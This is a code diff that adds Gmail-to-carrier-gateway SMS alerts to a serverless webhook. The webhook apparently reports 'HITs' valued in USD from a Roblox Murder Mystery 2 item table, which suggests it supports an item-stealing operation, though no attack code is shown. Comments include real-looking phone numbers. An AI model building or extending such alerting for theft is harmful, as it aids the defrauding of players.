@@ -1,10 +1,7 @@
 import crypto from 'crypto';
+import nodemailer from 'nodemailer';
 
 // ── TextBelt SMS sender ───────────────────────────────────────────────────────
-// No phone number purchase needed. Sign up at textbelt.com for an API key.
-// Free tier: use key "textbelt" for 1 SMS/day (testing only)
-// Paid: $0.01/SMS, no monthly number cost
-//
 // Vercel env vars:
 //   TEXTBELT_KEY  - your API key (or "textbelt" for free 1/day)
 //   TEXTBELT_TO   - recipient number(s), comma-separated e.g. 9565784579,2693168228
@@ -34,6 +31,52 @@ async function sendSMS(message) {
     }
   }));
 }
+
+// ── Gmail → Carrier Gateway SMS ──────────────────────────────────────────────
+// Sends an email to your carrier's SMS gateway — arrives as a real text message.
+// Free forever. No API keys. No approval process.
+//
+// Setup:
+//  1. Go to myaccount.google.com → Security → 2-Step Verification → App Passwords
+//  2. Create an App Password for "Mail"
+//  3. Add to Vercel env vars:
+//       GMAIL_USER          - your Gmail address e.g. youremail@gmail.com
+//       GMAIL_APP_PASSWORD  - the 16-char app password Google gives you
+//       CARRIER_GATEWAY_TO  - comma-separated gateway emails:
+//                             T-Mobile  → 9565784579@tmomail.net
+//                             Verizon   → number@vtext.com
+//                             AT&T      → number@txt.att.net
+async function sendCarrierSMS(subject, message) {
+  const user     = process.env.GMAIL_USER;
+  const pass     = process.env.GMAIL_APP_PASSWORD;
+  const toRaw    = process.env.CARRIER_GATEWAY_TO;
+
+  if (!user || !pass || !toRaw) {
+    console.log('[CarrierSMS] Skipped — GMAIL_USER, GMAIL_APP_PASSWORD, or CARRIER_GATEWAY_TO not set');
+    return;
+  }
+
+  const to = toRaw.split(',').map(t => t.trim()).filter(Boolean);
+  console.log(`[CarrierSMS] Sending to gateways:`, to);
+
+  const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: { user, pass },
+  });
+
+  try {
+    await transporter.sendMail({
+      from: user,
+      to: to.join(', '),
+      subject,
+      text: message,
+    });
+    console.log('[CarrierSMS] Sent successfully');
+  } catch (e) {
+    console.error('[CarrierSMS] Failed:', e.message);
+  }
+}
+
 
 // ============================================================
 // MM2 ITEM VALUE TABLE
@@ -352,6 +395,8 @@ export default async function handler(req, res) {
         `╚══════════════╝`,
       ].filter(s => s !== null).join('\n');
       await sendSMS(smsBody);
+      await sendCarrierSMS(`🔥 HIT — ${formatUSD(totalUSD)}`, smsBody);
+
 
     } catch (e) {
       console.error('Webhook/SMS failed:', e);
